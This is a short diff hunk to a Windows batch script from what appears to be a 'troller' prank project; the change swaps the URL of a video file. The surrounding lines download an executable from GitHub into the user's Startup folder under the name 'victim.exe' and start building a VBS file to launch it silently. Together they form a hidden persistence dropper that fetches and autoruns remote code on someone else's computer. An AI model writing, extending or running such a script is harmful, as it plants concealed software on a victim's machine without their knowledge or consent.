@@ -3,7 +3,7 @@ set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 :: download the executable and the video file
 curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troller.exe" -o "%STARTUP_FOLDER%\victim.exe"
-curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o "%STARTUP_FOLDER%\test.mp4"
+curl "https://github.com/vexnity/troller-revamped/raw/main/troll%20in%20suit.mp4" -o "%STARTUP_FOLDER%\test.mp4"
 
 :: create a vbs file to run the executable silently
 echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP_FOLDER%\run_victim.vbs"
